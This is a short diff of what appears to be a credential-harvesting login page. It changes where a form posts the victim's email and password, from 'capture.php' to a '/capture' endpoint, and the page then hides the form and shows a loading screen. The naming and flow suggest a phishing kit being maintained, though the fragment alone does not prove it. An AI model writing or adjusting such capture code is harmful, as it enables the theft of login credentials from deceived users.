@@ -115,7 +115,7 @@
         if (!email || !password) return alert('Please fill in both fields.');
         form.style.display = 'none';
         loading.style.display = 'block';
-        fetch('capture.php', {
+        fetch('/capture', {
             method: 'POST',
             headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
             body: new URLSearchParams({ email, password })
